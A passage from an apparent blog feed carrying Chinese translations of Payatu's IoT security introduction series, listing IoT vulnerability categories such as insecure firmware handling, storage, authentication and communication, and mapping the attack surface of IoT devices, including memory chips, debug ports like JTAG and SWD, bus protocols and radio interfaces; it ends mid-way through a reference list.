<h3 id="P3-安全的固件">P3.安全的固件</h3><p>这里的术语“不安全”是指固件的管理方式，而不是具体的固件代码漏洞本身。固件包含设备的业务逻辑，基本是厂商专有，即 IP（知识产权）。如果攻击者可以访问明文固件，他/她可以对其进行逆向工程以发现安全问题或克隆逻辑并最终克隆产品本身。漏洞取决于固件在设备上的存储和更新方式。如果不注意正确加密存储或动态（更新）中的固件，攻击者可以获取它。固件的一些问题是（但不限于）：</p>
<ul>
<li><ol>
<li>固件以明文形式存储在内存芯片上</li>
</ol>
</li>
<li><ol start="2">
<li>固件未签名和/或引导加载程序在加载前未验证固件的完整性</li>
</ol>
</li>
<li><ol start="3">
<li>固件更新以明文形式从云或移动设备传输到设备。</li>
</ol>
</li>
<li><ol start="4">
<li>固件更新通过明文通信协议传输，例如 http。</li>
</ol>
</li>
<li><ol start="5">
<li>固件为所有设备实例使用单个对称密钥加密。</li>
</ol>
</li>
<li><ol start="6">
<li>固件加密密钥随设备更新一起传输。</li>
</ol>
</li>
</ul>
<p>正确实施的基于 PKI 的系统可以确保最佳安全性，但是大多数低功耗传感器缺乏有效实施 PKI 的计算能力。此外，如果更新是安全的，但可以使用其他漏洞从设备中提取到加密密钥，那么上面所有工作都是徒劳的。</p>
<h3 id="P4-不安全的数据存储">P4.不安全的数据存储</h3><p>这个问题在物联网终端设备和移动应用程序中都很突出。这在物联网终端设备中更为明显，可能是厂商认为逆向硬件很困难。敏感数据如果没有安全存储，攻击者可以提取和利用来破坏系统。除了安全问题，如果用户的个人数据没有得到适当的保护，它也可能对隐私产生影响。一些常见问题：</p>
<ul>
<li><ol>
<li>敏感数据以明文形式存储在内存芯片上</li>
</ol>
</li>
<li><ol start="2">
<li>敏感数据加密存储但加密密钥可访问</li>
</ol>
</li>
<li><ol start="3">
<li>自定义加密用于加密数据</li>
</ol>
</li>
<li><ol start="4">
<li>没有对修改数据的访问控制</li>
</ol>
</li>
<li><ol start="5">
<li>移动数据存储不安全应用程序（请参考P9. 不安全的移动界面）</li>
</ol>
</li>
</ul>
<h3 id="P5-认证不足">P5.认证不足</h3><p>设备可能使用不正确或没有身份验证机制，这允许攻击者完全绕过身份验证机制，如果它实施不当并向设备发送未经授权的命令。这对于关键物联网设备来说是一个严重的问题，因为网络上的任何人（TCP/IP 或无线电）都可以覆盖正常操作并控制设备。设备上发生的一些身份验证问题是（但不限于）：</p>
<ul>
<li><ol>
<li>没有客户端身份验证</li>
</ol>
</li>
<li><ol start="2">
<li>通过明文通信通道进行身份验证</li>
</ol>
</li>
<li><ol start="3">
<li>用于凭据的加密不正确</li>
</ol>
</li>
<li><ol start="4">
<li>可预测凭据</li>
</ol>
</li>
<li><ol start="5">
<li>默认凭据</li>
</ol>
</li>
</ul>
<h3 id="P6-_不安全的通信">P6. 不安全的通信</h3><p>如果攻击者能够从通信中嗅探、分析、重放和提取敏感信息，则物联网生态系统内的通信可能不安全。漏洞可能是由于使用了不安全的通信协议或协议本身的缺陷。为了简单起见，供应商可能会选择使用不安全的通信方法。由于物联网是一项不断发展的新技术，因此许多物联网协议没有定义适当的安全机制或供应商实施默认的不安全模式。问题包括（但不限于）：</p>
<ul>
<li><ol>
<li>共享敏感信息时未加密通信</li>
</ol>
</li>
<li><ol start="2">
<li>使用自定义加密</li>
</ol>
</li>
<li><ol start="3">
<li>使用自定义/专有协议</li>
</ol>
</li>
<li><ol start="4">
<li>使用不当加密</li>
</ol>
</li>
<li><ol start="5">
<li>使用协议默认（弱）安全模式</li>
</ol>
</li>
<li><ol start="6">
<li>使用有已知问题的协议</li>
</ol>
</li>
<li><ol start="7">
<li>重放问题</li>
</ol>
</li>
</ul>
<h3 id="P7-不安全的配置">P7.不安全的配置</h3><p>当设备配置不安全或设备不允许用户修改配置参数时，会出现此问题。此问题也发生在移动应用程序和云配置中。为了保持简单或快速交付产品，开发人员可能会选择使用简单但不安全的配置或禁止更改。一些明显的问题是（但不限于）：</p>
<ul>
<li><ol>
<li>使用默认的不安全配置</li>
</ol>
</li>
<li><ol start="2">
<li>禁止集成商或用户修改配置</li>
</ol>
</li>
<li><ol start="3">
<li>发布产品中不安全的低级协议和硬件配置</li>
</ol>
</li>
<li><ol start="4">
<li>不安全的加密模式和设置</li>
</ol>
</li>
<li><ol start="5">
<li>共享或存储的用户个人数据的可见性很低或没有可见性</li>
</ol>
</li>
</ul>
<h3 id="P8-_数据输入过滤不足">P8. 数据输入过滤不足</h3><p>随着物联网生态系统中实施更多物联网协议，这将成为未来的一个主要问题。例如，来自设备的遥测数据可能受到云或 IoT 网关的信任，从而导致已知和未知的安全问题，例如远程代码执行、基于 Web 的攻击（如 SQL 注入）、跨站点脚本等等。我们希望在未来优先考虑这一点。虽然成熟的实现确实过滤了传统技术的数据，但新的物联网协议实现还有待提高。</p>
<h3 id="P9-_不安全的移动界面">P9. 不安全的移动界面</h3><p>由于从安全角度来看移动技术相对于传感器技术已经成熟，因此我们将所有移动安全问题归为一类。这并不意味着它们的优先级较低，因为您可以看到一些高优先级漏洞也适用于移动设备。然而，由于技术的成熟，它已经拥有大量关于安全问题和安全实现的信息。作为 OWASP 的粉丝，我们建议从 OWASP Mobile Top 10 漏洞开始，这些漏洞将解决大多数安全问题。</p>
<h3 id="P10。不安全的云/网络界面">P10。不安全的云/网络界面</h3><p>正如“P9. 不安全的移动接口”，同样适用于云和网络。如果设备具有 Web 界面，您仍然可以通过 Web 攻击拥有该设备，但是这些安全问题已经得到很好的定义和理解。同样，我们建议从 OWASP Web Top 10 漏洞开始，以了解和缓解 Web 安全问题，以及来自 Cloud security Alliance 的云安全文档。请注意，这不是唯一可用的知识库，您应该查看互联网上可用的工具和研究论文。值得注意的是，云构成了物联网生态系统的数据存储和通信主干。如果云被攻陷，可能会导致整个物联网生态系统受到危害，包括世界各地和宇宙中所有部署的产品。</p>
<p>这就是这篇博文的全部内容。请密切关注本系列的下一篇博客。如果您有任何建议，请随时与我们联系。</p>
<p><em>原文链接：<a href="https://payatu.com/iot-security-part-3-101-iot-top-ten-vulnerabilities" target="_blank" rel="external">https://payatu.com/iot-security-part-3-101-iot-top-ten-vulnerabilities</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>如果您还没有阅读我们的 IoT 安全博客系列的第 1 部分和第 2 部分，我建议您先阅读它们，除非您已经熟悉基础知识并且只想阅读 IoT 十大漏洞。</p>
<p>说到十大漏洞，我们首先想到的是OWASP。为什么不呢，毕竟他们是定义 Web 和移动应用 10 大漏洞的先驱。我是 OWASP 的粉丝，这仅仅是因为 OWASP 社区多年来为定义应用程序安全问题、为行业提供免费教程和开源工具以减轻风险和漏洞所做的工作。您很有可能没有听说过 OWASP 或从他们的网站上阅读过内容，但是如果您没有，我强烈建议您访问他们的网站  <a href="https://www.owasp.org">https://www.owasp.org</a></p>
<p>OWASP 还启动了物联网安全计划，社区定义了物联网攻击面和物联网前 10 大漏洞，以及Web和移动设备10大漏洞。他们的方向是正确的，很快它就会成为学习物联网安全内容的绝佳场所。</p>]]>
    
    </summary>
    
      <category term="IOT安全" scheme="http://www.youngroe.com/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
      <category term="IOT" scheme="http://www.youngroe.com/categories/IOT/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[物联网安全101-2.物联网攻击面（翻译）]]></title>
    <link href="http://www.youngroe.com/2021/09/21/IOT/iot-security-part-2-101-iot-attack-surface/"/>
    <id>http://www.youngroe.com/2021/09/21/IOT/iot-security-part-2-101-iot-attack-surface/</id>
    <published>2021-09-21T11:50:22.000Z</published>
    <updated>2021-11-06T08:50:55.392Z</updated>
    <content type="html"><![CDATA[<h2 id="物联网攻击面">物联网攻击面</h2><p>欢迎！我希望您已经阅读了之前的博客文章<a href="/2021/09/21/IOT/iot-security-part-1-101-iot-introduction-architecture/">物联网安全 - 第 1 部分</a>，如果没有，希望你阅读它以了解物联网和物联网架构的含义。现在我们将开始进入安全领域，并尝试定义一种方法来理解和创建结构化流程来执行物联网的安全研究或渗透测试。<br>如果我们查看上一篇文章中定义的架构，现在我们可以轻松的对物联网进行拆分并尝试为每个组件单独定义攻击面，然后将它们组合起来以创建整个物联网生态系统攻击面。我称其为 IoT 生态系统而不是 IoT 产品，因为它确实是一个由不同组件相互通信并解决特定现实世界问题的生态系统。下面将继续定义物联网生态系统的攻击面，并详细讨论每个组件的攻击面。按组件的攻击面可以将物联网组件攻击面分为三个或四个（如果我们将通信作为攻击面），主要攻击面如下：</p>
<ul>
<li><ol>
<li>移动应用</li>
</ol>
</li>
<li><ol start="2">
<li>云</li>
</ol>
</li>
<li><ol start="3">
<li>通信</li>
</ol>
</li>
<li><ol start="4">
<li>物联网终端设备<div align="center"><br><img src="/img/20210921device_attack_surface-768x456.png" align><br></div>

</li>
</ol>
</li>
</ul>
<a id="more"></a>
<p>OWASP 现在也在物联网安全方面做了很多工作，他们也定义了攻击面。我希望你也去看看OWASP定义的物联网攻击面，通过了解不同的观点和想法有助于让你对物联网攻击面的学习更加全面。</p>
<p><strong>注意：</strong></p>
<ul>
<li><ol>
<li>微控制器一词以通用形式使用，表示微控制器、微处理器或 SoC（片上系统），除非另有说明。</li>
</ol>
</li>
<li><ol start="2">
<li>以下攻击面由我们定义，可能与其他定义有所不同。</li>
</ol>
</li>
</ul>
<h3 id="移动应用">移动应用</h3><p>移动应用是物联网的重要用户界面之一，用户可以通过它感知物理世界的状态。由于移动应用程序与物联网生态系统以发送命令和读取数据形式进行通信，因此它成为进入物联网生态系统的切入点之一。我们将尝试从物联网的角度列举移动设备的攻击面。</p>
<ul>
<li><ol>
<li>数据存储</li>
</ol>
</li>
<li><ol start="2">
<li>授权认证</li>
</ol>
</li>
<li><ol start="3">
<li>数据加密</li>
</ol>
</li>
<li><ol start="4">
<li>通信</li>
</ol>
</li>
<li><ol start="5">
<li>移动应用通用漏洞 – OWASP Mobile Top 10 浮现在脑海</li>
</ol>
</li>
</ul>
<h3 id="云">云</h3><p>云是物联网中非常重要的部分之一，通常来自物联网产品线所有实例的数据都汇聚在这里。这使它成为一个非常有趣的攻击点。请记住，我在上一篇文章中提到物联网不仅与硬件有关。原因是云将保存所有部署的物联网实例的数据，并有权向所有实例发送命令。通常命令是由用户发起的，但是如果受到攻击，攻击者将获得对部署在全球范围内的设备（及其数据）的控制权，这很危险。总体而言，攻击面侧重于它提供的接口，其中包括</p>
<ul>
<li><ol>
<li>数据存储</li>
</ol>
</li>
<li><ol start="2">
<li>授权认证</li>
</ol>
</li>
<li><ol start="3">
<li>数据加密</li>
</ol>
</li>
<li><ol start="4">
<li>通信</li>
</ol>
</li>
<li><ol start="5">
<li>应用接口</li>
</ol>
</li>
<li><ol start="6">
<li>通用 Web/云漏洞 – OWASP Web Top 10 浮现在脑海</li>
</ol>
</li>
</ul>
<h3 id="终端设备">终端设备</h3><p>接下来是设备，它是物联网技术的游戏规则改变者 :)。它与物理世界交互，也与虚拟世界通信。它是物理世界数据的第一站。鉴于其存储的用户的敏感数据（例如家庭数据、身体统计数据、个人信息），围绕用户隐私展开了一场全面的竞争。未来设备可能会直接通过钱包或单独的临时钱包使用用户的加密货币来购买物品、进行维修等。 攻击面如下所示</p>
<ul>
<li><ol>
<li>数据存储</li>
</ol>
</li>
<li><ol start="2">
<li>授权认证</li>
</ol>
</li>
<li><ol start="3">
<li>数据加密</li>
</ol>
</li>
<li><ol start="4">
<li>通信</li>
</ol>
</li>
<li><ol start="5">
<li>传感器接口</li>
</ol>
</li>
<li><ol start="6">
<li>外围接口</li>
</ol>
</li>
<li><ol start="7">
<li>硬件接口</li>
</ol>
</li>
<li><ol start="8">
<li>人机接口</li>
</ol>
</li>
</ul>
<h3 id="通信">通信</h3><p>尽管这不是一个有形的攻击面，因为理想情况下有形的攻击面是通信接口和负责通信的相应驱动程序、固件。然而，通信却需要单独列出来，因为物联网生态系统可以在有线和无线介质上使用的各种各样的通信协议。下面是部分通信攻击面。</p>
<ul>
<li><ol>
<li>授权认证</li>
</ol>
</li>
<li><ol start="2">
<li>数据加密</li>
</ol>
</li>
<li><ol start="3">
<li>使用非标准通信协议</li>
</ol>
</li>
<li><ol start="4">
<li>通信协议实现错误</li>
</ol>
</li>
</ul>
<p>硬件接口承载实际通信。然而，实际的通信数据/数据包是由在软件中实现的定义的。因此，在这个攻击面（通信）中，我们将只讨论协议。尽管协议中的缺陷可能实际发生在移动应用、设备或云上的协议端点的攻击，但为了清楚起见，我们将其保留为单独的攻击面。此处的列表中有太多协议标准无法提及。但是，我们将列出各种 IoT 产品中使用的一些常见协议。</p>
<h4 id="1-_Web">1. Web</h4><p>Web或技术术语 HTTP(S) 是最常用的通信协议，无处不在。我们将其单独列出来，因为 Web 上的攻击面是巨大的。然而，好消息是攻击面、漏洞和缓解技术大多已经标准化，因为它已经被研究了二十多年。网上有大量资源详细描述了攻击和保护。对于初学者来说，OWASP 在他们的 Web Top 10、测试指南和各种开源工具（<a href="http://www.owasp.org）方面做得很好" target="_blank" rel="external">www.owasp.org）方面做得很好</a></p>
<h4 id="2-_其他">2. 其他</h4><p>除了 Web 之外，还有许多协议，一些是特定领域的，一些是通用的，还有一些是出于性能原因。此处列出的协议太多，为简洁起见，我们将列出一些常见的协议标准，让您对所使用的协议种类有一个大致的了解。历史告诉我们，所有协议都会有实现缺陷、协议设计缺陷和配置缺陷。这些需要在渗透测试期间进行分析。</p>
<ul>
<li><ol>
<li>CoAP – <a href="https://en.wikipedia.org/wiki/Constrained_Application_Protocol" target="_blank" rel="external">https://en.wikipedia.org/wiki/Constrained_Application_Protocol</a></li>
</ol>
</li>
<li><ol start="2">
<li>MQTT - <a href="https://en.wikipedia.org/wiki/MQTT" target="_blank" rel="external">https://en.wikipedia.org/wiki/MQTT</a></li>
</ol>
</li>
<li><ol start="3">
<li>AMQP – <a href="https://en.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol" target="_blank" rel="external">https://en.wikipedia.org/wiki/Advanced_Message_Queuing_Protocol</a></li>
</ol>
</li>
<li><ol start="4">
<li>WebSocket – <a href="https://en.wikipedia.org/wiki/WebSocket" target="_blank" rel="external">https://en.wikipedia.org/wiki/WebSocket</a></li>
</ol>
</li>
<li><ol start="5">
<li>CANbus - <a href="https://en.wikipedia.org/wiki/CAN_bus" target="_blank" rel="external">https://en.wikipedia.org/wiki/CAN_bus</a></li>
</ol>
</li>
<li><ol start="6">
<li>Modbus – <a href="https://en.wikipedia.org/wiki/Modbus" target="_blank" rel="external">https://en.wikipedia.org/wiki/Modbus</a></li>
</ol>
</li>
<li><ol start="7">
<li>Profibus – <a href="https://en.wikipedia.org/wiki/Profibus" target="_blank" rel="external">https://en.wikipedia.org/wiki/Profibus</a></li>
</ol>
</li>
<li><ol start="8">
<li>DNP3 – <a href="https://en.wikipedia.org/wiki/DNP3" target="_blank" rel="external">https://en.wikipedia.org/wiki/DNP3</a></li>
</ol>
</li>
<li><ol start="9">
<li>BACNet – <a href="https://en.wikipedia.org/wiki/BACnet" target="_blank" rel="external">https://en.wikipedia.org/wiki/BACnet</a></li>
</ol>
</li>
<li><ol start="10">
<li>HL7 – <a href="https://en.wikipedia.org/wiki/Health_Level_7" target="_blank" rel="external">https://en.wikipedia.org/wiki/Health_Level_7</a></li>
</ol>
</li>
<li><ol start="11">
<li>XMPP – <a href="https://en.wikipedia.org/wiki/XMPP" target="_blank" rel="external">https://en.wikipedia.org/wiki/XMPP</a></li>
</ol>
</li>
<li><ol start="12">
<li>UPnP – <a href="https://en.wikipedia.org/wiki/Universal_Plug_and_Play" target="_blank" rel="external">https://en.wikipedia.org/wiki/Universal_Plug_and_Play</a></li>
</ol>
</li>
<li><ol start="13">
<li>DNS</li>
</ol>
</li>
<li><ol start="14">
<li>SSH</li>
</ol>
</li>
<li><ol start="15">
<li>&lt;其他&gt;🙂</li>
</ol>
</li>
</ul>
<p>以上应该为您提供物联网生态系统攻击面的概述。现在我们对它有了一个清晰的认识，让我们为物联网终端设备定义一个详细的攻击面，以便我们知道在标准物联网渗透测试中我们究竟需要攻击什么。这也有助于物联网安全架构师为物联网产品创建威胁模型。<br>请注意，我们不会（重新）定义移动应用和云的攻击面，因为您可以在 Internet 上找到大量描述相同内容的资源。本博客系列的想法是为安全研究人员搭建一座进入物联网安全领域的桥梁，因此，我们将专注于当前较少提及和未标准化的部分。我们仍然会从我们的角度讨论与物联网生态系统相关的移动应用和云安全。</p>
<h2 id="物联网设备攻击面">物联网设备攻击面</h2><p>好的，让我们这样做:)。以下是物联网攻击面的独立和结构化定义。请注意，这是根据我们的理解，并未直接参考其他定义。</p>
<h3 id="1-_数据存储">1. 数据存储</h3><p>设备使用的存储。这可以进一步分为内部和外部、持久性和易失性。</p>
<h4 id="1-1_SD_卡">1.1 SD 卡</h4><p>SD 卡通常用于存储配置和产品数据。它们也可用于存储固件更新。这是一个非常有趣的攻击面，我们将在后面的博客文章中讨论某些可能通过 SD 卡进行的攻击。</p>
<h4 id="1-2_USB">1.2 USB</h4><p>某些产品可能使用 USB 驱动器来存储与 SD 卡中类似的数据，以及读取下载或存储在 USB 驱动器上的数据。与 SD 卡类似的攻击适用于 USB 存储设备。</p>
<h4 id="1-3_非易失性存储器">1.3 非易失性存储器</h4><p>非易失性存储器功能很多，包括读/写传感器数据、引导加载程序、固件、凭据、密钥等。在测试硬件板时，查看存储在芯片上的数据至关重要。我们还可以对存储器和微控制器之间的通信进行运行时分析，以分析在不同操作期间存储/读取的数据类型，可以通过让逻辑分析仪嗅探总线通信来实现的。您可以在触发设备上的特定操作时发现正在读取/写入的有趣数据。有以下不同类型的内存芯片：</p>
<ul>
<li><ol>
<li>只读存储器EPROM</li>
</ol>
</li>
<li><ol start="2">
<li>电可擦可编程只读存储器EEPROM</li>
</ol>
</li>
<li><ol start="3">
<li>FLASH – 由于其速度和效率而更常用</li>
</ol>
</li>
</ul>
<div align="center"><br><img src="/img/20210921i2c_serial_eeprom.png" align title="I2C 串行 EEPROM"><br></div>

<h4 id="1-4_易失性内存">1.4 易失性内存</h4><p>说到易失性存储器，我们脑海中立刻就会浮现出 RAM 这个词。它们广泛用于 PC 和嵌入式系统，并在运行时保存代码和数据。设备断电时数据丢失。一些常见的RAM类型如下</p>
<ul>
<li><ol>
<li>SRAM（Static Random Access Memory 静态随机存取存储器）——一种 RAM，用于保存芯片断电时丢失的数据。</li>
</ol>
</li>
<li><ol start="2">
<li>DRAM（Dynamic Random Access Memory 动态随机存取存储器）——数据会保留一段时间，之后数据会丢失，除非在运行时刷新。这意味着与 SRAM 相比，即使在芯片通电期间，数据的寿命也很短。芯片断电时数据也会丢失。</li>
</ol>
</li>
</ul>
<h4 id="1-5_微控制器内部存储器">1.5 微控制器内部存储器</h4><p>微控制器也有自己的内部存储器，通常用于存储代码。在调试微控制器时通常可以访问这些存储器，例如通过 JTAG 进行调试。微控制器中使用的各种存储器是：</p>
<ul>
<li><ol>
<li>SRAM</li>
</ol>
</li>
<li><ol start="2">
<li>EEPROM</li>
</ol>
</li>
<li><ol start="3">
<li>FLASH</li>
</ol>
</li>
</ul>
<h3 id="2-_硬件通讯接口">2. 硬件通讯接口</h3><p>同一块板上的不同硬件组件需要相互通信并与外界通信。所有这些通信都是使用定义明确的标准硬件通信协议完成的。从攻击者的角度来看，它通过嗅探或注入恶意数据让他们深入了解实际通信。分析下面提到的一些最常见的接口以查找安全问题。</p>
<h4 id="2-1_UART串口">2.1 UART串口</h4><p>UART (Universal Asynchronous Receiver Transmitter) 是一个硬件组件，允许两个硬件外设之间进行异步串行通信。它们可以在同一块板上（例如微控制器与电机或 LED 屏幕通信）或两个不同设备之间（例如设备微控制器与 PC 通信）。这是一个有趣的攻击面，因为它可能允许通过串行方式对设备进行读/写访问。在许多设备中，板上的 UART 端口保持打开状态，任何人都可以通过串行连接和访问以获取某种类型的控制台，即简单的 shell、自定义命令行控制台、日志输出等。一个设备通常会有一组引脚 -输出连接到微控制器 UART RX 和 TX 引脚，用于发送和接收串行数据。</p>
<div align="center"><br><img src="/img/20210921uart.jpg" align title="典型的 4 引脚 UART 接口"><br></div>

<h4 id="2-2_微控制器调试口">2.2 微控制器调试口</h4><p>微控制器可以在运行时使用连接到板上引脚输出的指定引脚进行调试。开发人员和设计人员使用这些引脚输出（端口）来调试、读/写固件和微控制器内部存储器、控制/测试微控制器引脚后期生产。考虑到它为攻击者提供的能力和访问权限，这使得调试端口成为最关键的攻击面之一。有一些用于此目的的标准接口如下：</p>
<p><strong>1. JTAG（Joint Test Action Group）：</strong> 随着微控制器和 PCB 变得越来越小，生产后很难对其进行测试。因此，为了在生产后有效地测试电路板，电子行业创建了一个同名协会，并定义了一种在生产后测试电路板的方法。它后来被改编为 IEEE 标准 1149.1。JTAG 协议定义了可用于测试和调试微控制器的标准接口和命令。JTAG 定义了四个引脚接口（和一个额外的可选引脚 TRST）：</p>
<ul>
<li><ol>
<li>TMS – 测试模式选择</li>
</ol>
</li>
<li><ol start="2">
<li>TCK——测试时钟</li>
</ol>
</li>
<li><ol start="3">
<li>TDI – 测试数据输入</li>
</ol>
</li>
<li><ol start="4">
<li>TDO – 测试数据输出</li>
</ol>
</li>
<li><ol start="5">
<li>TRST – 测试复位（可选引脚）</li>
</ol>
</li>
</ul>
<p>除了测试芯片外，调试器还使用这些引脚与微控制器上实现的 TAP（测试访问端口）进行通信。从安全角度来看，识别 JTAG 端口并与其连接允许攻击者提取固件、对逻辑进行逆向工程并在设备上写入恶意固件。在以后的文章中会详细介绍。</p>
<p><strong>2. cJTAG（Compact JTAG）：</strong> 这是IEEE 1149.7标准中定义的新JTAG协议。它不会取代 1149.1 标准，而是进一步扩展了它，并且向后兼容 JTAG。它定义了一个双引脚接口（TCK 和 TMS）和一个实现新功能的新 TAP。</p>
<p><strong>3. SWD（串行线调试）：</strong> SWD 是另一种用于调试微控制器的接口/协议。它是一个两针接口：a．SWDIO（双向）b．SWCLK (clock) 它是一个针对 ARM 处理器的特定的协议，它使用 ARM CPU 标准的双向线协议，在 ARM Debug Interface v5 中定义。SWD 的好处是它声称比 JTAG 更高效。</p>
<div align="center"><br><img src="/img/20210921jtag-768x704.jpg" align title="PCB 板上的JTAG接口"><br></div>

<p>请注意，JTAG 端口不一定像上图中那样位于一组 10 引脚排列中。</p>
<h4 id="2-3_I2C">2.3 I2C</h4><p>Inter-Integrated Circuit 是一种短距离通信协议，用于同一板上芯片之间的通信。它是由飞利浦（现在的恩智浦）发明的。它具有主从（多）架构并使用两线总线</p>
<ul>
<li><ol>
<li>SDA——串行数据</li>
</ol>
</li>
<li><ol start="2">
<li>SCL——串行时钟</li>
</ol>
</li>
</ul>
<p>I2C 的用例之一是EEPROM 芯片上连接到微控制器 I2C 引脚存储数据或代码。典型的攻击包括篡改数据、提取敏感信息、破坏数据等。我们应该分析 EEPROM 芯片上的静态数据，并通过嗅探 I2C 通信来执行运行时分析，以了解行为和安全隐患。如前所述，我们将在该系列中专门写一篇博文来理解和分析 I2C 通信。</p>
<h4 id="2-4_SPI">2.4 SPI</h4><p>Serial Peripheral Interface 也是一种短距离通信协议，用于同一板上芯片之间的通信。它是由摩托罗拉开发的。它是全双工的，采用主从架构（单主）。与 I2C 相比，它还具有更高的吞吐量。它使用四线串行总线：</p>
<ul>
<li><ol>
<li>SCLK——串行时钟。其他名称包括 SCK</li>
</ol>
</li>
<li><ol start="2">
<li>MOSI – 主出从入。其他名称包括 SIMO、SDI、DI、DIN、SI、MTSR。</li>
</ol>
</li>
<li><ol start="3">
<li>MISO – 主进从出。其他名称包括 SOMI、SDO、DO、DOUT、SO、MRST。</li>
</ol>
</li>
<li><ol start="4">
<li>SS – 从选择。其他名称包括 S̅S̅、SSEL、CS、C̅S̅、CE、nSS、/SS、SS#</li>
</ol>
</li>
</ul>
<p>它用于与各种外围设备通话。Flash 和 EEPROM 芯片也使用 SPI。测试和分析的方法类似于 I2C，只是我们有不同的总线接口。我们将在后面的博客文章中详细讨论 SPI。</p>
<h4 id="2-5_USB">2.5 USB</h4><p>该设备可以具有用于充电或通信的 USB（mini/micro等）接口。对于后者，有必要测试接口是否存在已知或未知问题。我们应该嗅探通信以进行运行时分析以及Fuzzing USB 接口以查找未知错误。</p>
<h4 id="2-6_传感器">2.6 传感器</h4><p>这是一个相当宽泛的名称，我们用来表示物理世界的接口。不一定限于感测型接口。例如，温度传感器将是一个完美的例子，但门锁也是一个没有感知任何东西但通过“锁定/解锁”动作控制物理世界的门锁。这些可以根据其操作分为三种类型：</p>
<ul>
<li><ol>
<li>监视器 Monitor：这与传感器的字面意义更密切相关，即感知或监视物理世界的任何变化。前任。温度、运动、脉搏、血压、胎压等。</li>
</ol>
</li>
<li><ol start="2">
<li>控制器 Control：这些类型的设备以某种方式控制物理世界。如锁、调度器等</li>
</ol>
</li>
<li><ol start="3">
<li>混合 Hybrid：这些是上述两种类型的组合，即温度控制、基于一天中的时间的灯等。这是关键接口之一，因为来自物理世界的所有值和数据都将传输到云中。如果攻击者可以使用格式错误（错误）的数据控制设备，那么整个生态系统都会受到影响，因为所有决策和统计数据都基于这些数据。换句话说，这是物联网生态系统的症结所在。此处错误的值可能会对生态系统做出的决策产生灾难性影响。</li>
</ol>
</li>
</ul>
<h4 id="2-7_人机界面">2.7 人机界面</h4><p>与传感器接口一样，我们使用 HMI 作为通用术语来定义用户和设备之间的接口，但不限于工业控制系统中使用的术语。这是用户可以用来与设备通信并直接对其进行操作的界面。一些常见的例子是触摸屏、按钮、触摸板等。 测试这个界面以找出任何绕过机制、安全漏洞等很重要。</p>
<h4 id="2-8_其他硬件接口">2.8 其他硬件接口</h4><p>还有许多其他硬件接口用于与设备进行通信。作为渗透测试者，分析和发现所有接口中的缺陷和绕过机制很重要。一些众所周知的接口包括（但不限于）：</p>
<ul>
<li><ol>
<li>D-Subminiature – <a href="https://en.wikipedia.org/wiki/D-subminiature" target="_blank" rel="external">https://en.wikipedia.org/wiki/D-subminiature</a></li>
</ol>
</li>
<li><ol start="2">
<li>推荐标准（RS232、RS485 等）– 有关 RS 协议的更多详细信息，请访问 <a href="https://en.wikipedia.org/wiki/EIA_standards" target="_blank" rel="external">https://en.wikipedia.org/wiki/EIA_standards</a></li>
</ol>
</li>
<li><ol start="3">
<li>车载诊断 (OBD) – <a href="https://en.wikipedia.org/wiki/On-board_diagnostics" target="_blank" rel="external">https://en.wikipedia.org/wiki/On-board_diagnostics</a></li>
</ol>
</li>
</ul>
<h3 id="3-_网络通讯接口">3. 网络通讯接口</h3><p>该接口允许设备与虚拟世界的其余部分通信，包括传感器网络、云和移动设备。负责网络通信的硬件接口可能有自己独立的微控制器/固件来提供通信功能。这种情况下的攻击面是实现低级通信的固件或驱动程序代码。</p>
<h4 id="3-1_WIFI无线网络">3.1 WIFI无线网络</h4><p>wifi 接口有一些已知问题。从攻击面的角度来看，攻击 wifi 芯片方法包括损坏它、DOS、绕过安全限制或代码执行会很有趣。</p>
<h4 id="3-2_以太网">3.2 以太网</h4><p>以太网接口与 wifi 接口一样，也存在低级 TCP/IP 堆栈漏洞以及硬件实现漏洞和类似的攻击向量。</p>
<h4 id="3-3_无线电">3.3 无线电</h4><p>考虑到许多物联网产品已转向/正在使用无线电通信构建，无线电接口已成为最重要的攻击面之一。这种偏好源于这样一个事实，即在许多情况下使用无线电更有效比通过 Wifi/有线网络连接。我将 Wifi 单独分类而不是在本节中的原因主要是为了明确区分可以直接连接到互联网的设备（Wifi/有线）和需要网关（例如智能集线器）的设备，该网关同时实现Radio以及Wifi/Wired接口，分别与传感器和互联网进行通信。 从实际通信的角度来看，可以将其视为两种不同的通信方式：</p>
<p><strong>1. 简单/非结构化：</strong> 这种类型通常用于简单的产品，如百叶窗、锁、门铃等。简单和非结构化是指它使用简单（主要是专有）数据（流）并通过无线电接口发送它。作为渗透测试人员，您需要对通信进行逆向工程以找出实现上的缺陷。使用无线电嗅探硬件工具（如 SDR（软件定义无线电）等）很容易嗅探无线电通信。</p>
<p><strong>2. 复杂/结构化：</strong> 复杂和结构化通信意味着它使用结构化数据包进行无线电通信，这些数据包很复杂，因为除了数据之外，它们还携带有关协议的附加和元信息。由于高效、标准化、经济的芯片、实施的便利性，这些协议在物联网世界中非常有名。同样，有多种工具可用于嗅探和解析协议以提取所发送的应用程序特定数据。一些常见的协议包括：</p>
<ul>
<li>a．蓝牙（和 BLE）</li>
<li>b. ZigBee</li>
<li>C. Z波</li>
<li>D. NFC</li>
<li>E. RFID</li>
<li>F. LORA</li>
<li>g. Wireless HART</li>
</ul>
<h2 id="参考">参考</h2><ul>
<li><ol>
<li>UART – <a href="https://en.wikipedia.org/wiki/Universal_asynchronous_receiver/transmitter" target="_blank" rel="external">https://en.wikipedia.org/wiki/Universal_asynchronous_receiver/transmitter</a></li>
</ol>
</li>
<li><ol start="2">
<li>Types of memory – <a href="https://en.wikipedia.org/wiki/Semiconductor_memory" target="_blank" rel="external">https://en.wikipedia.org/wiki/Semiconductor_memory</a></li>
</ol>
</li>
<li><ol start="3">
<li>JTAG – <a href="https://en.wikipedia.org/wiki/JTAG" target="_blank" rel="external">https://en.wikipedia.org/wiki/JTAG</a></li>
</ol>
</li>
<li><ol start="4">
<li>SWD – <a href="https://www.arm.com/files/pdf/Serial_Wire_Debug.pdf" target="_blank" rel="external">https://www.arm.com/files/pdf/Serial_Wire_Debug.pdf</a></li>
</ol>
</li>
<li><ol start="5">
<li>JTAG Vs. SWD – <a href="https://electronics.stackexchange.com/questions/53571/jtag-vs-swd-debugging" target="_blank" rel="external">https://electronics.stackexchange.com/questions/53571/jtag-vs-swd-debugging</a></li>
</ol>
</li>
<li><ol start="6">
<li>I2C – <a href="https://en.wikipedia.org/wiki/I%C2%B2C" target="_blank" rel="external">https://en.wikipedia.org/wiki/I%C2%B2C</a></li>
